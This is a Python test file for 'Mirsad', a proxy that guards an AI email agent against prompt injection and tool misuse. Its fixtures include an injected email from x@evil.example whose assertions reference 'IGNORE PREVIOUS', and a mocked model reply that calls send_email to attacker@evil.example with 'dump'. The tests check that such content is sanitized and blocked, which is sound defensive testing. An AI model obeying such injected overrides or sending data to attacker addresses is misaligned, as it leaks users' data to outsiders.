"""OpenAI-compatible proxy with a mocked upstream LLM (httpx.MockTransport)."""

from __future__ import annotations

import json
import sys
import types as pytypes
from types import SimpleNamespace
from typing import Any

import httpx
import pytest
from adapters_testkit import INJECTION, SANITIZED_MARK, FakeGateway
from fastapi import FastAPI

from mirsad.adapters import openai_proxy
from mirsad.adapters.openai_proxy import build_openai_router, session_id_for
from mirsad.config import Settings

AGENT = SimpleNamespace(id="agent-1", name="Email bot", policy_agent_id="email-crm-assistant")


class FakeLLM:
    """Records forwarded requests and answers with a canned chat completion."""

    def __init__(
        self, reply: dict[str, Any] | None = None, status: int = 200, error: Exception | None = None
    ) -> None:
        self.reply = reply or completion(content="Done.")
        self.status = status
        self.error = error
        self.requests: list[httpx.Request] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        if self.error is not None:
            raise self.error
        return httpx.Response(self.status, json=self.reply)

    @property
    def last_body(self) -> dict[str, Any]:
        return json.loads(self.requests[-1].content)


def completion(content: str | None = None, tool_calls: list[dict] | None = None) -> dict[str, Any]:
    message: dict[str, Any] = {"role": "assistant", "content": content}
    if tool_calls:
        message["tool_calls"] = tool_calls
    return {
        "id": "chatcmpl-1",
        "object": "chat.completion",
        "created": 1760000000,
        "model": "qwen2.5:7b",
        "choices": [
            {"index": 0, "message": message, "finish_reason": "tool_calls" if tool_calls else "stop"}
        ],
        "usage": {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15},
    }


def tool_call(call_id: str, name: str, arguments: Any) -> dict[str, Any]:
    args = arguments if isinstance(arguments, str) else json.dumps(arguments)
    return {"id": call_id, "type": "function", "function": {"name": name, "arguments": args}}


def make_app(gateway: FakeGateway, llm: FakeLLM, **router_kwargs: Any) -> tuple[FastAPI, httpx.AsyncClient]:
    app = FastAPI()
    app.state.gateway = gateway
    app.state.settings = Settings(
        llm_base_url="http://llm.test/v1", llm_api_key="ollama-key", llm_model="qwen2.5:7b"
    )
    upstream = httpx.AsyncClient(transport=httpx.MockTransport(llm))

    async def agent_dep() -> SimpleNamespace:
        return AGENT

    router_kwargs.setdefault("agent_dependency", agent_dep)
    app.include_router(build_openai_router(http_client=upstream, **router_kwargs))
    client = httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app),
        base_url="http://mirsad.test",
        headers={"Authorization": "Bearer mk_agent_secret"},
    )
    return app, client


CONVERSATION = [
    {"role": "system", "content": "You are the Najd Trading Co. e-mail assistant."},
    {"role": "user", "content": "Summarise e-mail E2."},
    {
        "role": "assistant",
        "content": None,
        "tool_calls": [tool_call("call_1", "read_email", {"email_id": "E2"})],
    },
    {
        "role": "tool",
        "tool_call_id": "call_1",
        "content": json.dumps({"from": "x@evil.example", "body": INJECTION}),
    },
]


async def post(client: httpx.AsyncClient, body: dict[str, Any], **headers: str) -> httpx.Response:
    return await client.post("/v1/chat/completions", json=body, headers=headers or None)


# --------------------------------------------------------------------------- request side


async def test_tool_messages_are_inspected_before_forwarding() -> None:
    gateway, llm = FakeGateway(), FakeLLM(completion(content="The e-mail asks for nothing legitimate."))
    _, client = make_app(gateway, llm)
    resp = await post(client, {"model": "qwen2.5:7b", "messages": CONVERSATION})
    assert resp.status_code == 200
    forwarded = llm.last_body["messages"]
    assert SANITIZED_MARK in forwarded[3]["content"] and "IGNORE PREVIOUS" not in forwarded[3]["content"]
    assert forwarded[:3] == CONVERSATION[:3]
    inspected = gateway.inspected[0]
    assert inspected.tool == "read_email"  # resolved from the preceding assistant tool_calls
    assert inspected.call_id == "call_1" and inspected.agent_id == "email-crm-assistant"
    assert inspected.structured["from"] == "x@evil.example"
    data = resp.json()
    assert data["choices"][0]["message"]["content"] == "The e-mail asks for nothing legitimate."
    assert data["usage"]["total_tokens"] == 15  # upstream fields preserved
    assert data["mirsad"]["tool_results"] == [
        {"tool_call_id": "call_1", "tool": "read_email", "action": "sanitize"}
    ]


async def test_inspection_is_cached_across_turns() -> None:
    gateway, llm = FakeGateway(), FakeLLM()
    _, client = make_app(gateway, llm)
    await post(client, {"messages": CONVERSATION})
    await post(client, {"messages": [*CONVERSATION, {"role": "assistant", "content": "ok"}]})
    assert len(gateway.inspected) == 1
    assert SANITIZED_MARK in llm.last_body["messages"][3]["content"]


async def test_legacy_function_messages_and_content_parts() -> None:
    gateway, llm = FakeGateway(), FakeLLM()
    _, client = make_app(gateway, llm)
    messages = [
        {"role": "user", "content": [{"type": "text", "text": "Fetch the page"}]},
        {"role": "assistant", "content": None, "function_call": {"name": "fetch_url", "arguments": "{}"}},
        {
            "role": "function",
            "name": "fetch_url",
            "content": [{"type": "text", "text": f"Welcome! {INJECTION}"}],
        },
        {"role": "tool", "tool_call_id": "call_orphan", "name": "read_document", "content": "plain doc"},
    ]
    resp = await post(client, {"messages": messages})
    assert resp.status_code == 200
    assert [r.tool for r in gateway.inspected] == ["fetch_url", "read_document"]
    assert SANITIZED_MARK in llm.last_body["messages"][2]["content"]


async def test_tool_definitions_are_filtered_by_policy() -> None:
    gateway, llm = FakeGateway(visible={"read_email"}), FakeLLM()
    _, client = make_app(gateway, llm)
    tools = [
        {"type": "function", "function": {"name": "read_email", "parameters": {"type": "object"}}},
        {"type": "function", "function": {"name": "delete_customer", "parameters": {"type": "object"}}},
    ]
    choice = {"type": "function", "function": {"name": "delete_customer"}}
    await post(client, {"messages": CONVERSATION[:2], "tools": tools, "tool_choice": choice})
    body = llm.last_body
    assert [t["function"]["name"] for t in body["tools"]] == ["read_email"]
    assert "tool_choice" not in body

    hidden_only = FakeGateway(visible=set())
    _, client2 = make_app(hidden_only, llm)
    await post(client2, {"messages": CONVERSATION[:2], "tools": tools, "parallel_tool_calls": True})
    assert "tools" not in llm.last_body and "parallel_tool_calls" not in llm.last_body

    _, client3 = make_app(FakeGateway(visible=set()), llm, filter_tools=False)
    await post(client3, {"messages": CONVERSATION[:2], "tools": tools})
    assert len(llm.last_body["tools"]) == 2


# --------------------------------------------------------------------------- response side


async def test_allowed_tool_calls_pass_through_unchanged() -> None:
    calls = [tool_call("call_9", "read_email", {"email_id": "E1"})]
    gateway, llm = FakeGateway(), FakeLLM(completion(tool_calls=calls))
    _, client = make_app(gateway, llm)
    data = (await post(client, {"messages": CONVERSATION[:2]}, **{"X-Mirsad-Session": "conv-1"})).json()
    choice = data["choices"][0]
    assert choice["finish_reason"] == "tool_calls"
    assert choice["message"]["tool_calls"] == calls
    checked = gateway.checked[0]
    assert (checked.call_id, checked.tool, checked.arguments) == ("call_9", "read_email", {"email_id": "E1"})
    assert checked.session_id == "conv-1" and checked.agent_id == "email-crm-assistant"
    assert data["mirsad"]["tool_calls"][0]["action"] == "allow"


async def test_denied_tool_call_is_removed_and_explained() -> None:
    calls = [
        tool_call("call_2", "send_email", {"to": "attacker@evil.example", "subject": "x", "body": "dump"})
    ]
    gateway, llm = FakeGateway(deny={"send_email"}), FakeLLM(completion(tool_calls=calls))
    _, client = make_app(gateway, llm)
    resp = await post(client, {"messages": CONVERSATION})
    data = resp.json()
    choice = data["choices"][0]
    message = choice["message"]
    assert "tool_calls" not in message
    assert choice["finish_reason"] == "stop"
    assert message["role"] == "assistant"
    assert "Tool call blocked: send_email" in message["content"]
    assert "تم منع استدعاء الأداة" in message["content"]
    assert data["mirsad"]["tool_calls"][0]["reasons"] == ["TAINT_UNTRUSTED_DESTINATION"]
    assert resp.headers["x-mirsad-session"].startswith("oa-")


async def test_partial_denial_keeps_allowed_calls() -> None:
    calls = [
        tool_call("call_a", "read_email", {"email_id": "E1"}),
        tool_call("call_b", "send_email", {"to": "attacker@evil.example"}),
    ]
    reply = completion(content="Working on it.", tool_calls=calls)
    gateway, llm = FakeGateway(deny={"send_email"}), FakeLLM(reply)
    _, client = make_app(gateway, llm)
    data = (await post(client, {"messages": CONVERSATION[:2]})).json()
    choice = data["choices"][0]
    assert [tc["id"] for tc in choice["message"]["tool_calls"]] == ["call_a"]
    assert choice["finish_reason"] == "tool_calls"
    assert choice["message"]["content"].startswith("Working on it.\n\n[Mirsad] Tool call blocked: send_email")


async def test_malformed_arguments_fail_closed_without_reaching_gateway() -> None:
    calls = [tool_call("call_m", "send_email", "{not json"), tool_call("call_n", "send_email", "[1, 2]")]
    gateway, llm = FakeGateway(), FakeLLM(completion(tool_calls=calls))
    _, client = make_app(gateway, llm)
    data = (await post(client, {"messages": CONVERSATION[:2]})).json()
    assert "tool_calls" not in data["choices"][0]["message"]
    assert {c["reasons"][0] for c in data["mirsad"]["tool_calls"]} == {"MALFORMED_ARGUMENTS"}
    assert gateway.checked == []


async def test_gateway_failures_fail_closed() -> None:
    calls = [tool_call("call_x", "read_email", {"email_id": "E1"})]
    _, client = make_app(FakeGateway(fail_check=True), FakeLLM(completion(tool_calls=calls)))
    data = (await post(client, {"messages": CONVERSATION[:2]})).json()
    assert "tool_calls" not in data["choices"][0]["message"]
    assert data["mirsad"]["tool_calls"][0]["reasons"] == ["GATEWAY_ERROR"]

    llm = FakeLLM()
    _, client2 = make_app(FakeGateway(fail_inspect=True), llm)
    await post(client2, {"messages": CONVERSATION})
    forwarded = llm.last_body["messages"][3]["content"]
    assert "withheld" in forwarded and INJECTION not in forwarded


# --------------------------------------------------------------------------- protocol details


async def test_session_id_from_header_or_first_user_message() -> None:
    assert session_id_for([], "a", "  my-session ") == "my-session"
    first = session_id_for(CONVERSATION, "email-crm-assistant", None)
    assert first == session_id_for(CONVERSATION[:2], "email-crm-assistant", None)
    assert first != session_id_for([{"role": "user", "content": "other"}], "email-crm-assistant", None)
    assert first != session_id_for(CONVERSATION, "another-agent", None)

    calls = [tool_call("call_s", "read_email", {"email_id": "E1"})]
    gateway, llm = FakeGateway(), FakeLLM(completion(tool_calls=calls))
    _, client = make_app(gateway, llm)
    await post(client, {"messages": CONVERSATION[:2]})
    await post(client, {"messages": CONVERSATION})
    assert gateway.checked[0].session_id == gateway.checked[1].session_id == first


async def test_upstream_authorization_never_leaks_agent_key() -> None:
    gateway, llm = FakeGateway(), FakeLLM()
    _, client = make_app(gateway, llm)
    await post(client, {"messages": CONVERSATION[:2]})
    first = llm.requests[-1]
    assert first.headers["authorization"] == "Bearer ollama-key"
    assert str(first.url) == "http://llm.test/v1/chat/completions"
    assert llm.last_body["model"] == "qwen2.5:7b"
    await post(client, {"messages": CONVERSATION[:2]}, **{"X-Upstream-Authorization": "sk-test-123"})
    assert llm.requests[-1].headers["authorization"] == "Bearer sk-test-123"
    for request in llm.requests:
        assert "mk_agent_secret" not in str(request.headers)


async def test_request_validation() -> None:
    _, client = make_app(FakeGateway(), FakeLLM())
    streaming = await post(client, {"messages": CONVERSATION[:2], "stream": True})
    assert streaming.status_code == 400 and "Streaming" in streaming.json()["detail"]
    assert (await post(client, {"messages": []})).status_code == 400
    assert (await post(client, {"messages": ["not an object"]})).status_code == 400
    raw = await client.post(
        "/v1/chat/completions", content=b"{oops", headers={"Content-Type": "application/json"}
    )
    assert raw.status_code == 400


async def test_upstream_errors_are_reported() -> None:
    err = {"error": {"message": "model 'gpt-9' not found", "type": "invalid_request_error"}}
    _, client = make_app(FakeGateway(), FakeLLM(err, status=404))
    resp = await post(client, {"model": "gpt-9", "messages": CONVERSATION[:2]})
    assert resp.status_code == 404 and resp.json() == err

    down = FakeLLM(error=httpx.ConnectError("refused"))
    _, client2 = make_app(FakeGateway(), down)
    assert (await post(client2, {"messages": CONVERSATION[:2]})).status_code == 502

    slow = FakeLLM(error=httpx.ReadTimeout("slow"))
    _, client3 = make_app(FakeGateway(), slow)
    assert (await post(client3, {"messages": CONVERSATION[:2]})).status_code == 504


async def test_fallback_agent_dependency_uses_mirsad_auth(monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[tuple[Any, str]] = []

    def authenticate_agent_key(db: Any, key: str) -> Any:
        seen.append((db, key))
        return AGENT if key == "mk_agent_secret" else None

    fake_auth = pytypes.ModuleType("mirsad.auth")
    fake_auth.authenticate_agent_key = authenticate_agent_key
    monkeypatch.setitem(sys.modules, "mirsad.auth", fake_auth)

    app, client = make_app(FakeGateway(), FakeLLM(), agent_dependency=openai_proxy._fallback_require_agent)
    app.state.db = "db-handle"
    ok = await post(client, {"messages": CONVERSATION[:2]})
    assert ok.status_code == 200
    assert seen == [("db-handle", "mk_agent_secret")]
    bad = await client.post(
        "/v1/chat/completions",
        json={"messages": CONVERSATION[:2]},
        headers={"Authorization": "Bearer mk_wrong"},
    )
    assert bad.status_code == 401
    anonymous = httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://mirsad.test")
    assert (
        await anonymous.post("/v1/chat/completions", json={"messages": CONVERSATION[:2]})
    ).status_code == 401
